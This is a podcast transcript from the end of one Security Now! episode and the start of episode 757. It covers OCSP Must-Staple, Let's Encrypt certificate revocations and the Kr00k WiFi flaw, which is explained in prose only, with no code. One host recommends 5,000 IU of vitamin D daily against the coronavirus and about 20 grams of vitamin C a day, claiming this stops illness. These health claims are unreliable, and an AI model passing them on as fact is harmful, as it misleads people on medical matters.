STEVE:  And so it occurred to me that if it was up to the web server to instruct the web browser to require a freshly stapled certificate, then a stolen and later revoked certificate might still be usable because the malicious server would certainly not ask browsers to require that the stolen certificate be accompanied with a fresh stapled OCSP assertion.  So I double-checked.  I found the well-known security researcher Scott Helme's clearly written page on OCSP Must-Staple.  I have a link in the show notes for anyone who's interested.  His page starts out by saying:  "Revocation checking is broken and has been for some time."  I think this was a couple years ago, as I recall.  He said:  "While some vendors have sort of worked around this with proprietary solutions, there is little that smaller sites can do.



"In the early days of the web we had Certificate Revocation Lists, or CRLs.  These were lists of all certificates that a CA had revoked and could be downloaded by a client to check if the certificate they were served had been revoked.  These lists didn't scale and eventually downloading these large files became a problem.  Thus the Online Certificate Status Protocol, or OCSP, was born.  Instead of the client downloading a list of all revoked certificates, they would submit a request to the CA to check the status of the specific certificate they have just received.  Sadly, OCSP was riddled with problems like poor CA infrastructure being unavailable and the privacy concern of clients leaking the site they were visiting back to the CA."  That's a good point.  I had forgotten to mention that last week.



"To get around this problem, OCSP Stapling was created.  Instead of the client making the OCSP request to the CA, the host website would make the request and 'staple' the response to the certificate when they served it.  Because the OCSP response is short-lived and digitally signed by the CA, the client can trust the stapled OCSP response.  The final problem was that the client had no idea that the site in question supports OCSP and whether or not it should expect them to staple an OCSP response."  That last is what had occurred to me.  He says:  "Thus we finally arrived at OCSP Must-Staple."  That is, not just OCSP stapling, but OCSP Must-Staple.



"Setting the OCSP Must-Staple is fairly easy as it's simply a flag that needs to be set by your certificate authority in the certificate they generate for you.  This flag instructs the browser that the certificate must be served with a valid OCSP response, or your browser should hard fail the connection."  So in other words, that's exactly what we wanted.  It's not up to the server.  The must-staple flag is bound into the certificate authority-signed certificate.  So any attempted use of the certificate would carry the must-staple flag.  As long as the recipient honors the must-staple flag, the certificate would be far better protected than even a one-year expiration on certificates would provide.



So the only reason then I could see for not taking the must-staple path would be that we're not yet ready for its deployment.  I did some more digging.  And I found a year-old assessment of the support of OCSP Must-Staple among browsers.  As of January 2019, a little over a year ago, only Firefox 60 of all browsers respected OCSP Must-Staple.



LEO:  So what's the point?



STEVE:  Yes.  Chrome 66 did not.  Opera did not.  Safari does not.  IE11 did not.  Edge 42 did not.  And the last update on the server side that I was able to find indicated that, while Microsoft's IIS supports OCSP Stapling properly, neither Apache nor Nginx do.  Those open source server implementations were still minimal and not well implemented.  So our industry has taken the path of least resistance and has chosen the lowest common denominator solution, which doesn't even begin to deliver equivalent security.  One year?  We could easily have one day of window.  But because no one has pushed the open source servers nor end-users' browsers, with the sole exception of Mozilla's Firefox, everyone is instead having to be hassled with much more frequent certificate issuance, whether manually or through automation.  And even after that's done, we still have truly pathetic certificate revocation security.  A year, as we noted last week. 



And you know, you really would think that Google, with their proven ability to guide the industry due to the strength of Chrome and now Chromium, which everybody else is using except Mozilla, you'd think that Google would be leading the way here.  After all, their browser's revocation with that CRLSET debacle remains, as we know, the worst of all.  But that hasn't happened yet.



So it really looks as though this is where we as an industry should focus.  Once our web servers are up to speed, and all our browsers honor Must-Staple, then nothing - and think about this.  Once our web browsers are up to speed with honoring Must-Staple, which could easily be done, and we have web servers which - again, IIS is there, and Apache, and Nginx.  They sort of have half-hearted implementations.  They just need to get fixed.  They don't do the - they don't look at the Staple expiring and go out and reach out and respect the cache life of the certificate and so forth.  So trivially fixed.



If we had that, then nothing would prevent certificate authorities from having a choice, from giving users a choice.  They could issue 10-year life certs with must-staple flags set, which would be far more secure than anything we have today.  And browser behavior could be adaptive.  Apple could set up Safari to limit the total lifetime of all non-must-staple certificates to one year.  And maybe it even can get shorter in the future.  But then to allow any certificate bearing the must-staple flag to have any lifetime it wishes because the second it becomes revoked, within a day it would stop being honored.  Nothing is preventing that scenario other than the industry's own laziness and inertia.



LEO:  You know who wishes it were working right now?  Let's Encrypt.  They have to revoke three million certificates.  And they gave users 24 hours to fix it.



STEVE:  Yup.  You need to refresh your Let's Encrypt cert.  They found a bug in their CAA code.



LEO:  Whoops.



STEVE:  Which is the DNS record that allows a Certificate Authority permission to issue a certificate.  We've talked about this before, the CAA record.  It specifies which certificate authorities are permitted to issue that domain certificates.  So it is a voluntary thing; but it's simple, and simple to implement.  And again, Let's Encrypt had a bug in their code.  So you're right, Leo.



LEO:  So if they revoke these certs today, which they're going to do, they say, but we don't have a system for checking revocation, does it matter? 



STEVE:  Yeah.  The sites will stop working.



LEO:  Oh, they will stop working.



STEVE:  Oh, I see.  If they revoke them, yes, and nobody checks.



LEO:  And nobody checks.



STEVE:  I wonder if Let's Encrypt runs an OCSP server.  They probably do.



LEO:  Oh, maybe they staple and say check our server.  Maybe they do.  Because otherwise, I mean, isn't that the problem, that you can revoke all you want?  It doesn't much matter?



STEVE:  Yeah.  Yeah.



LEO:  Since nobody's checking?  No, they must do something else.  I wonder if they do, if they run their own...



STEVE:  The good news is anyone using Chrome will have no problem at all.



LEO:  Because it will just go [dismissive sound].



STEVE:  Because Chrome does not check.  It doesn't care at all.



LEO:  Doesn't care at all.



STEVE:  No.



LEO:  Oh, my god.  It could not be worse.



STEVE:  So I have a weird public service announcement, which I was put in mind of by all this recent news about the COVID-19 coronavirus pandemic.  Which put me in mind of Security Now! Episode 200 - I was going to say 2,000, but no, it'll only have three digits.



LEO:  No.



STEVE:  209, which you and I recorded in mid-August of 2009.



LEO:  Have it been that long?  Wow.



STEVE:  So 10.5 years ago, Leo.



LEO:  That's amazing.  It feels like just yesterday.



STEVE:  And I went to the episode.  It describes itself, it says:  "Steve and Leo kick off the podcast's fifth year with a rare off-topic discussion of something Steve has been researching for the past eight weeks and passionately believes everyone needs to know about."  And that of course was the famous Vitamin D episode.



LEO:  Okay.  So last time we talked you said, oh, you don't have to take as much as we thought.



STEVE:  I don't remember saying that.



LEO:  Oh, okay.  Okay.  I must have misunderstood.



STEVE:  I don't remember saying that.  So, you know, I don't want to go on at great length because all the information is available.  GRC.com/health/vitamin-d.htm will quickly take you to the audio.  We also covered news of the week and so forth.  But I finished by talking about Vitamin D.  You can also just google "GRC Vitamin D."  It'll take you to that page.  Any listeners who joined us in the last 10.5 years probably missed that.  And so that's why I'm bringing it up today, and only just pointing to it.  The short version is I explained in great detail what I had learned, the fact that it's not a vitamin.  It's been misnamed, mislabeled.  It's actually a hormone.  It's fat soluble, not water soluble, so it builds up over time in our tissues.



The government's stated minimal - the RDA, the Recommended Daily Allowance, I think last time I looked was 400 IU, which is pathetic.  It doesn't - it's not - it's just ridiculous.  And we have no way of really knowing what we should have, except that by looking at the blood of people who work with their shirts off in the sun, literally lifeguards and roofers, we believe we have a sense for what a natural blood level is.  The problem is it's synthesized.  There's almost no dietary source.  Our skin synthesizes it when UVB radiation interacts with cholesterol in our skin to produce this hormone, to synthesize it as a result of UVB radiation hitting our skin.  But UVB radiation doesn't penetrate glass.  We are typically behind glass or with clothes on most of the time.



LEO:  Well, nobody goes outside anymore.  If you do, you slather sunscreen on, and you put on a broad-brimmed hat.



STEVE:  You see people hiding behind umbrellas to keep the sun off of their skin.



LEO:  My alabaster skin may not be touched by the sun.



STEVE:  So what happened was I actually got an interesting research study out of this because we talked about it in mid-August 2009.  In the spring of 2010 I began getting email from our listeners who were incredulous over the fact that it was the first winter they had ever in their memory gone through where they never got sick.  People, their family members were getting sick around them.  They didn't get sick because they listened to the podcast.  They heeded the advice.  I love this advice because a bottle of 5,000 IU of Vitamin D, 360 little tiny, little itty-bitty, I call them "little drops of sunshine," costs about $15.  So a year's supply, one a day, a year's supply is 15 bucks.



And I'm bringing it up now because it is an across-the-board immune booster.  The podcast goes into lots of detail about how Caucasians happened as a result of the importance of Vitamin D.  So I just wanted to sort of point our listeners to it.  We've got this problem right now with what looks like a viral pandemic that's going to be significant.  So this is when you want you and your family and your friends to have the greatest immunity to viruses possible.  One thing you can easily do is think about Vitamin D.  Listen to the podcast.



LEO:  5,000 IU.



STEVE:  5,000 IU.



LEO:  Is there a toxic level?  I mean, there's something we shouldn't go...



STEVE:  Yes, yes.  If you were to take 50,000 IU per day for several months, you could reach toxic levels.



LEO:  So only take one, not 10.



STEVE:  Just take one.



LEO:  Okay.



STEVE:  Yes.  Now, and for example, physicians who encounter people who are deficient will give somebody a shot in the arm of 25,000 IU.  So a brief burst of it also won't hurt you.



LEO:  It ain't gonna kill you.



STEVE:  It literally takes 50,000 a day for months for you to hurt yourself.



LEO:  But still, let's not overdo it.



STEVE:  And you should - there's no need to take more than 5,000 IU.  When I was experimenting, I was at 10.  And after a few months I noted my blood level because I was testing every week, I noticed that my level in my blood of the active form of Vitamin D, 25OHD, would finally kind of be creeping up into the 80s or 90s.  We don't even really know for sure what a maximum problem is.  But 5,000 is all you need.  400, which is what the government recommends, is not getting you off the ground.  Oh, and there's also D2 versus D3.  What you want - I explain all this in the podcast.  So if I've tickled your interest, listeners, and you're thinking about the coronavirus, and you're not already taking 5,000 IU of Vitamin D a day, check it out.



LEO:  D2, not D3.



STEVE:  No, no, D3.



LEO:  D3, not D2.



STEVE:  Yeah, D2 is not really effective.  It's synthesized from lanolin, as I recall; and it's not effective, whereas D3 is.  So anyway, don't take my word for it.  Do some googling.  In the years since I keep getting, like, there will be studies that are coming out, and they all reaffirm that we're not getting the Vitamin D we should.  A $15 bottle for a year just makes so much sense.  And for what it's worth, I nor my friends never get sick anymore because after I learned this, I switched to 5,000 IU a day, and it just ended.  You know, I tended to have a strong immune system anyway.  But now more than ever it really makes sense to beef that up.



LEO:  Or 125 micrograms, if you live in the sensible world.



STEVE:  Yes, yeah.  And that's just it.  It is, I remember talking about it, you need so little bit of it that...



LEO:  125 micrograms is nothing.



STEVE:  Yes.  They use a huge vat of olive oil.  They, like, drop a dropper into this huge vat.  They make sure that they stir it up sufficiently, and then they make these little itty-bitty capsules, so even people who are pill phobic, who can't swallow pills, these things are just little teeny bitty drops.



LEO:  Oh, they're teeny, yeah.



STEVE:  Yeah.



LEO:  I just put them in with all the other horse pills I'm taking.  I never even notice.



STEVE:  Me, too.  So I wanted to mention that I started working on the AHCI driver for SpinRite.  I already have low-level BIOS-bypassing hardware drivers in place for all the pre-AHCI technologies, so traditional IDE and the Legacy SATA controllers.  That's done now.  So the final piece of technology, as I mentioned last week, will be to add the same low-level hardware support for AHCI controllers.



We won't initially have USB, NVMe, or UEFI support.  Those will follow later.  But giving SpinRite the highest possible speed support for all spinning and SATA drives of any size will fulfill my commitment to bring the aging SpinRite v6 current with today's latest technologies.  And that's got my attention.  So I just wanted to give our listeners an update and thank them for their patience.



LEO:  How exciting.  Do you think Vitamin C will have any help in that, as well?



STEVE:  Well, I didn't want to push it because taking a useful amount of Vitamin C is difficult.



LEO:  It's a lot.  But I do what Lorrie does.  I put the liquid Vitamin C in my water.



STEVE:  Yes.  Yes, that liquid Vitamin C is what I would recommend for people.  The problem with C is that it's water soluble.  So it doesn't stay in us.  On the one hand, you don't have to worry about overdosing because you just - your body will just eliminate it.



LEO:  That's why you have to take it, instead of taking a big pill, you want to sip a little bit of it in the water at a time.



STEVE:  And that's a great way to do it.  And in fact that C that Lorrie and you are taking...



LEO:  Delicious.



STEVE:  ...has a nice sort of a citrus flavor to it.



LEO:  [Crosstalk] orange water.  It's really good, yeah.  I'm very happy.



STEVE:  Yeah.  And that's what I would recommend, yup.



LEO:  I get three grams a day in my 54-ounce Bubba.



STEVE:  Good.  And if you were taking 20 to 25, then you'd be taking enough.



LEO:  Steve says I have subclinical scurvy.



STEVE:  That's true.



LEO:  How much?



STEVE:  Yeah, about 20,000 grams.  I mean, 20,000 milligrams, 20 grams.



LEO:  20 grams a day.



STEVE:  Yeah, that's about what your liver is trying to produce.  It's a six-stage process to convert glucose into Vitamin C.  The last stage, there's an enzyme, L-gulonolactone oxidase, which we are not synthesizing, and that keeps our liver from giving us Vitamin C.  It's trying to.  Dogs and cats all make at least 10 grams a day.



LEO:  Wow.



STEVE:  So anyway.



LEO:  You should have as much as a dog, anyway.



STEVE:  That's right.



LEO:  All right.  I'm going to put more - I'm going to have more of that stuff.



STEVE:  Do it.  Especially now.



LEO:  It does give you chapped lips.  I've got to tell you, it gives you chapped lips.



STEVE:  I didn't know that.



LEO:  Did you not?  Have you not experienced that?



STEVE:  No, because I just take tablets.  I'm a tablet-taker.



LEO:  Oh, I'm a tablet-taker.



STEVE:  But if you only do one thing, do Vitamin D.  If you want to do more, then see about the liquid form of Vitamin C, which makes it very easy to sip throughout the day.



LEO:  Yeah, yeah.  Kr00k is KRACK.



STEVE:  So every so often a vulnerability comes along, and I'm not happy about it.  I'm not celebrating it.  But it is just so, well, our listeners will find out in a second.  It's just perfect.  Researchers at ESET named their latest discovery Kr00k, K-R-0-0-K, to highlight the zeroes in the name because the zeroes is what this latest discovery of a very serious WiFi vulnerability affecting more than a billion devices is all about.  So I really shouldn't sound happy about this at all.  And I'm not.  I mean, this is bad.  It's not, you know, end-of-the-world bad.  But I'll explain it in a minute.



It affects anything not yet patched containing the most popular WiFi chips in the industry, which are those manufactured by Broadcom and Cypress.  And those chips are included in devices such as Amazon's consumer Echo and Kindle devices; Apple's iPhones, iPads, and MacBooks; Google's Nexus smartphones; Samsung's Galaxy smartphones; the Raspberry Pi 3, Xiaomi Redmi smartphones, and access points from Asus and Huawei.  I mean, just to give a sense for how widespread this is.  All of those are, or were, vulnerable to Kr00k.  In other words, all consumer devices, access points, routers, and IoT gadgets, anything using WiFi chips from Broadcom or Cypress.  So we know, just based on the numbers, that this weighs in at more than a billion WiFi-capable things.  And since the Cypress chips are popular among IoT devices, their numbers are untold.



Okay.  So what happened?  ESET researchers came up with a very clever hack, which I suppose I'd call an "interlock" hack because it leverages two things that should have been carefully interlocked, but weren't.  A communications buffer that should have been flushed, but wasn't being, can arrange to be flushed if the device's firmware is updated.  So that's what will change after the firmware update.



But the bad news is that any of these more than a billion devices that are not updated will forever remain vulnerable to this subtle but readily exploitable firmware design flaw.  And you know, it seems like we're talking about these kinds of problems more and more.  You remember we had a Bluetooth, a similar Bluetooth problem not long ago, and I was using the example of an alarm system that was Bluetooth-enabled, and it had been abandoned by its Chinese supplier, or they'd gone out of business, or who knows what.  Or there was just never any intent to ever update its firmware after it was sold.  So it would forever be vulnerable.



So as our listeners are doubtless aware, this idea that everything is vulnerable at some level has gradually become an important and recurring topic of this podcast.  And as in this instance, this belief is not based upon a fear of the unknown.  It's unfortunately based upon solid practical experience and evidence.  Given everything we've learned about the desires and motivations of hackers and state actors, there's just no question that somewhere, or more likely at many somewheres, there are people methodically compiling these increasing number of things that, for some large swath of the device population, are never going to be fixed.  You know, for some time now I've been characterizing security as being porous, but it's becoming more so than I ever expected.



LEO:  Poor us.



STEVE:  Yes, poor us.



LEO:  Poor us.



STEVE:  Yes.  And so like all of the worst and most powerful attacks, this one is not complicated.  It's not like Spectre and Meltdown and those sort of theoretical...



LEO:  KRACK wasn't that easy, either; was it?  I mean, it was...



STEVE:  Nah, it wasn't.  And this is even easier, Leo.  Get a load of this.  Okay.  So point-to-point 802.11 Ethernet WiFi operates by associating and disassociating the paired endpoints with each other.  The association process involves the establishment of a shared cryptographic key given a shared secret.  So, for example, our home router is preconfigured with our WiFi network password.  So we give the same password to our laptop computer.  And because each knows the same shared secret, they're able to negotiate a session key which will be used to encrypt the communications.



We've talked about WiFi attacks in the past.  Being radio, denial of service is easy.  One brute force approach would be to jam the receiving end with radio frequency noise.  But a much more subtle attack is made possible by the fact that 802.11  WiFi connection management packets are never encrypted.  By definition, they are in the clear.  So they're like the management, not the actual connection.  So it's possible to deny any unwitting WiFi user the use of the nearby WiFi access point, simply by spoofing and sending disassociate packets to their laptop.  When the laptop receives a disassociate command, which again is not encrypted, so there's no need to know what the network's key is, that command will be immediately obeyed, and the user will drop off that 'Net connection.  However, their endpoint will then immediately start working to reassociate itself with the access point, so this process would need to be repeated if you wanted to hold them in denial of service.



Okay.  The clever Kr00k vulnerability occurs as a side effect of that disassociation.  Inside the WiFi firmware is the negotiated encryption key, and a fairly sizable 32K byte transmission buffer.  As one would hope and want, when a WiFi session is disassociated, that transient session encryption key that they were using is immediately and proactively zeroed.  It is wiped and literally set to all zeroes.  But unfortunately that 32K buffer is not also flushed.  Instead, believe it or not, it continues being sent out of the WiFi radio transmitter under the now zero key.  And the way the WPA2 AES-CCMP cipher mode operates, that's the standard cipher mode for WPA2, an all-zero key results in no encryption.  So the 32K bytes of data that was supposed to be protected under the shared session key now emerges from the device's WiFi radio transmitter in the clear as plaintext, completely unprotected.



ESET's disclosure whitepaper said:  "This serious flaw, assigned CVE-2019-15126, causes vulnerable devices to use an all-zero encryption key to encrypt part of the user's communication.  In a successful attack, this vulnerability allows an adversary to decrypt some wireless network packets transmitted by a vulnerable device.  Kr00k affects devices with WiFi chips," they write, "by Broadcom and Cypress that haven't yet been patched.  These are the most common WiFi chips used in contemporary WiFi-capable devices such as smartphones, tablets, laptops, and IoT gadgets.  Not only client devices, but also WiFi access points and routers with Broadcom chips were affected by the vulnerability, thus making many environments with unaffected or already patched client devices" - like our smartphones - "vulnerable anyway."



In other words, yeah, if you have an Apple iPhone, Apple has already patched.  But what about your old router?  And what about the router at Starbucks, or at the airport, or on the plane?  They said, continuing with what they wrote:  "Our tests confirmed that, prior to patching, client devices by Amazon, Apple, Google, Samsung, Raspberry, and Xiaomi, as well as some access points by Asus and Huawei, were vulnerable to Kr00k.  These totaled over a billion WiFi-capable devices and access points, at a conservative estimate.  Further, many other vendors whose products we did not test also use the affected chipsets in their devices.  The vulnerability affects both WPA2-Personal and WPA2-Enterprise protocols, with AES-CCMP encryption."



They said:  "Kr00k is related to KRACK (Key Reinstallation Attacks), discovered in 2017 by Mathy Vanhoef, but is also fundamentally different.  In the beginning of our research, we found Kr00k to be one of the possible causes behind the reinstallation of an all-zero encryption key observed in tests for KRACK attacks.  We responsibly disclosed the vulnerability to chip manufacturers Broadcom and Cypress, who subsequently released updates during an extended disclosure period.  We also worked with the Industry Consortium for Advancement of Security on the Internet (ICASI) to ensure that all potentially affected parties - including affected device manufacturers using the vulnerable chips, as well as any other possibly affected chip manufacturers - were also aware of Kr00k."



They said:  "According to our information, patches for devices by major manufacturers have been released by now."  Except, wait a minute, I'll get there in a second.  They said:  "To protect yourself as a user, make sure you've applied the latest available updates on all your WiFi-capable devices, including phones, tablets, laptops, IoT devices with WiFi, and WiFi access points and routers."



LEO:  [Whimpering]



STEVE:  "As a device manufacturer" - I know.  "As a device manufacturer, please inquire about patches for the Kr00k vulnerability directly from your chip supplier."  What I got a kick out of was that, despite the researchers' apparently diligent work to prewarn vendors, it appears that some major suppliers were still caught flat-footed.  The day after ESET's startling announcement and disclosure presentation during RSA, Cisco announced that it is "working to patch multiple products that are affected by the recently disclosed Kr00k vulnerability in WiFi chips from Broadcom and Cypress."  In the case of Cisco, the Kr00k vulnerability affects at least 14 identified so far Cisco products, I mean, including low-level enterprise and consumer routers.  Cisco said that it is "currently investigating its line of products to identify which ones are vulnerable."



LEO:  Which ones?  Which ones?



STEVE:  Geez.  And so far it found, like, all of them, all 14 that it has looked at because of course they are using the Broadcom chip.  So anyway, a clever discovery.  You send a dissociate packet, just to a device as it's transmitting, and suddenly you get 32K of unencrypted data.  If you time your disassociation right, that'll be the username and password to a website that you're logging onto over a secure connection, presumably.  So, yikes.



LEO:  So what are they - they're able to get my traffic.



STEVE:  They're able, yes, it decrypts your traffic between your device and the access point.  It's worth noting, if the traffic is itself encrypted, that is, if you have an HTTPS connection, then it's the WiFi wrapper that is decrypted, not the interior.



LEO:  So you're still secure.  Or if you're using a VPN.  This would be a good argument for getting that VPN fired up.



STEVE:  Yes, it would.  So you're still secure if you're over a VPN.  You're also secure, for example, this would be like the decryption of a non-encrypted WiFi.  So if you were using open WiFi in a Starbucks...



LEO:  Be just like that, yeah.



STEVE:  Then, yeah, exactly.  Then there's no encryption on the WiFi network.  Therefore you're relying upon the interior, you know, your own encryption, HTTPS encryption and, like, internal communications encryption.  So it's not that big a deal.  But for IoT devices, who knows what sort of mischief you can get up to by timing an IoT device's communication with its network, which is assuming WiFi encryption which no longer exists.  So again, this gets added to the bag of tricks that the bad guys will have and will be able to deploy over time.



LEO:  Wow.  Wow, wow, wow.



STEVE:  Yup.  It's good we're finding these things, but we really do seem to be creating them as quickly as we're eliminating them.  And older things will never get updated.  They will be Kr00ked for life.



LEO:  Kr00ked.



STEVE:  They will be Kr00ked.



LEO:  You're Kr00ked.  All right.  Well, thank you for filling us in on it, anyway.  Sounds like there will be patches to most things eventually, or...



STEVE:  They've already, well, see, so I'm sure that Google has already got their Nexus devices patched.  I know Apple has got theirs patched. 



LEO:  Okay.  So, and if you're using a - this is just a good argument for using a VPN.



STEVE:  It is, yup.



LEO:  Yeah.  And that's why we're glad HTTPS is so widespread.



STEVE:  Yes.  More so than ever.  We just wish our certificates were as secure as they could be.  Maybe we'll get that next.



LEO:  Staple your certificates, kids.



STEVE:  In the meantime, take a little drop of sunshine, a little drop of Vitamin D.



LEO:  Only one or two polls have been closed.  You're going to run, and you're going to go watch the TV and get all the results.  I will follow - oh, already I can give you some results.



STEVE:  No, don't.



LEO:  Nothing surprising.  No, no, save it.  No spoilers.  Spoiler alert.  New York Times...



STEVE:  The market, the stock market was suffering again today, as well.



LEO:  Lisa said just don't look.  Just don't look.



STEVE:  The New York Times is saying what again?



LEO:  You want to be surprised, don't you?



STEVE:  Okay, okay.



LEO:  They've already called a couple of states, let's put it that way.



STEVE:  I'm all into bonds.  I have nothing in the stock market.



LEO:  Oh, that's even worse. 



STEVE:  No, because I'm not selling them.  I'm letting them - I'm taking them to maturity.



LEO:  Yes.  I am, too.  I'm holding.  I'm a buy-and-hold kind of guy.



STEVE:  Yup, yup.



LEO:  Steve Gibson - and, by the way, I buy and hold mutual funds.  I don't buy and hold individual stocks because, you know, obviously for the work I do I don't want to be exposed.



STEVE:  Don't want your finger on the scale.



LEO:  No.  Steve Gibson is at GRC.com, where he does keep his finger on the scale, but in a good way.  He keeps his coffee on the scale, too.  He's got a Pringle's can full of coffee.  He's putting a Starbucks wrapper around it just to fool you.  You could use that as a WiFi antenna.  GRC.com is his website.  That's where you'll find SpinRite, the world's finest hard drive recovery and maintenance utility.  And by the way, if you buy it now, you'll get the upgrade to SpinRite 6.1 free.  It'll be part of the deal.



STEVE:  Before.  Before everybody else.



LEO:  Yeah, you get to test it, yup.  GRC.com.  While you're there, of course there's the 16Kb version of the show for bandwidth-impaired folks.  There's the 64Kb version for people who like full sound - full, rich sound.  There's also transcripts for people who like to read along.  That's a nice thing to have.  GRC.com.  He's on the Twitter at @SGgrc.  He takes DMs there, so if you have a question or a comment or suggestion, you can leave it there.



STEVE:  So much good stuff there.  Oh, my god, I need to spend more time there.  And every time I look, I'm like, ooh, that's good to know.



LEO:  Oh, I'm glad to hear that.



STEVE:  So thank you, all listeners.



LEO:  People are giving you some good stuff.  We have audio and video of the show.  If you're crazy enough to want to watch, you can do that at TWiT.tv/sn.  Or subscribe.  Best thing to do would be subscribe because it's an RSS feed, so that way you'll just get it automatically the minute it's available.



We do this show Tuesdays about 1:30 Pacific, 4:30 Eastern, 21:30 UTC.  Next week it will be at a different time because...



STEVE:  What?



LEO:  Well, we're going - no, you and I will be the same.  But we are springing forward on Sunday.



STEVE:  Finally.



LEO:  Finally.



STEVE:  Yay, we'll have summertime, yeah.



LEO:  Summertime, summertime.  So we are springing forward.  But that means - but UTC never moves.  So instead of 21:30 we'll be at 20:30 UTC.



STEVE:  We should stop that.  We should just leave it in summertime mode.



LEO:  So freaking confusing.  So, but I'm just glad that the farmers are saving kerosene.  That's the matter right here.  That's all we care about.  Save your kerosene for the war effort.  Yes, watch us live at TWiT.tv/live.  You can then chat along with the conversation on irc.twit.tv.  I think that's all I need to say.  You go watch TV.  I will be gone tomorrow because we're going to St. Louis.  Meet me in St. Louis for WWT, TWiT.tv/blog for more information.



STEVE:  Stay healthy.



LEO:  I will stay - I'm going to chugalug some Vitamin C before I go, and Vitamin D, too, before I go.



STEVE:  And they're saying now you just bump elbows.  You should not [crosstalk] handshake.



LEO:  No touching.  No touching.  No bad touch.  And don't wear a face mask because the doctors need those.  And wash your hands a lot.  I've got it all.  Thank you, Steve.



STEVE:  Good.



LEO:  We'll see you next week on Security Now!.



STEVE:  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.










GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#757

DATE:		March 10, 2020

TITLE:		The Fuzzy Bench

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-757.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we consider the new time-limited offers being made for free telecommuting tools, the continuing success of the DOD's "please come hack us" program, another take on the dilemma and reality of Android device security, some unwelcome news about AMD processor side-channel vulnerabilities, a new potentially serious and uncorrectable flaw in Intel processors, a 9.8-rated critical vulnerability in Linux system networking, a "stand back and watch the fireworks" forced termination of TLS v1.0 and v1.1, and the evolution of the SETI@home project after 19 years of distributed radio signal number crunching.  We then touch on a bit of miscellany, and finish by looking at a new and open initiative launched by Google to uniformly benchmark the performance of security fuzzers.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  He makes a pretty strong case for never using an Android phone.  That's coming up.  We'll also talk about AMD.  Yes, parity with Intel.  Now there's a speculative execution exploit for AMD processors.  Oh, goodie.  And we'll talk about the interesting technique called "fuzzing" used to find exploits.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 757, recorded Tuesday, March 10th, 2020:  The Fuzzy Bench.



It's time for Security Now!, the show you've been waiting for all week.  I know that because I meet people all the time who say, "I wait for it all week."  That's the guy you're waiting for, Steve Gibson.  He's always here on time.  I'm often late.  But thank you, Steve, for being patient.



STEVE GIBSON:  It's always my pleasure, and thank you for always bringing your Leo personality to the fore.  Whenever I'm going back, and I'm reducing the bandwidth of the video, I hear you just all perky and charged up, and I just think...



LEO:  Bubbly.  I'm bubbly.



STEVE:  ...that's what keeps us coming back for more is Leo is just, you know, he is a trained professional.  You can fake it like the best of them.



LEO:  Actually, I think what they come back for, Steve, is the information you impart.  So I will just - I'll thank you, but I will get out of the way and let you go.



STEVE:  Well, I had a little fun with this week's title, which is "The Fuzzy Bench," because Google is doing another thing to benefit the community.  Because, you know, they can afford to, and so why not?  We're going to talk about a new public and open initiative to solve the problem of fuzzy security testing benchmarking, after we get to a whole bunch of other interesting stuff.  We're going to look at the four time-limited offers now being made for free telecommuting tools to help corporations send their employees home and deal with remote work.  We're going to look at the continuing success, sort of surprising, of the DOD's "come hack us please" program.



We're going to look at another take on the dilemma and the reality of Android device security, and look at some unwelcome news - well, unwelcome to AMD - about a new side-channel vulnerability which has been found that affects their chips.  But Intel's not getting away from this week easily, either.  There is a new, potentially serious, and uncorrectable flaw in Intel processors, unlike what we've been talking about before.  There's also a 9.8, right, out of 10, so it's like, I'm not sure why it lost 0.2 - well, actually I am - a 9.8-rated critical vulnerability affecting Linux systems networking.



LEO:  Uh-oh.



STEVE:  Yeah.  But there's a spin to it, which is why most of our listeners don't need to worry, but some might.  There's also a "stand back and watch the fireworks" forced termination of TLS v1.0 and 1.1 on the horizon.  The evolution of the SETI@home project after 19 years of service.  And we'll talk about that a little bit.  Of course we are familiar with its distributed radio signal number crunching.  We touch a bit on miscellany, and finish by looking at a new and, as I said before, open initiative launched by Google to bring some uniformity to benchmarking the performance of security fuzzing.  Because what you really want is some good fuzz, Leo.  That's what I always say.  And we have an apropos Picture of the Week that just, I mean, I got maybe tweeted 50 different variations of this, some text, some images.  And our listeners will understand.  So, yeah. 



LEO:  It's a very geeky joke, but I like it.



STEVE:  It's way out there, yeah.  The only thing spoiling this Picture of the Week is that they misspelled the key word of the entire thing.



LEO:  Oh, they did, yeah.



STEVE:  But still the concept is conveyed.  The picture says:  "Due to the corono" - and that's where the misspelling was, it's corona - "virus COVID-19, all TCP applications are being converted to UDP to avoid handshakes."



LEO:  Very geeky.  Nice geeky joke.



STEVE:  Thank you for the gratuitous laughter, Leo.



LEO:  No, it's good.



STEVE:  Appreciated for the soundtrack of the podcast.



LEO:  It's like "There's no place like 127.0.0.1."  It's one of those geek jokes.



STEVE:  And I'm in danger of forgetting that this is the 42nd anniversary of also one of my favorite books, which you guys were talking about over on MacBreak Weekly.



LEO:  Yes.



STEVE:  And a listener who likes the book will realize that the 42nd anniversary...



LEO:  Is the most important.



STEVE:  Forty-two, yeah.



LEO:  I did not pick that up right away, by the way.  I was embarrassed.



STEVE:  Whenever I see the number, well, for example, our favorite calculator on iOS platform, PCalc, its icon is a 42.



LEO:  Mm-hmm.



STEVE:  For exactly that reason.  Anyway, for those who haven't figured out already, this is Douglas Adams's "Hitchhiker's Guide to the Galaxy," which was just, I mean, I agree with all the opinions from MacBreak Weekly.  It was so fun.  Everybody has their favorite bits.  And probably my very favorite one I can't do justice to because it's where he - and he does this several times in the book, where he's describing what's happening, and he says, "And then, after waiting, nothing happened.  And then, nothing continued to happen."  And he does all of this sort of like who's on first, who's on second.



LEO:  It's lovely British wordplay that is unique.  So funny.



STEVE:  Oh, it's just delicious.



LEO:  Yeah.  Love it, yup.



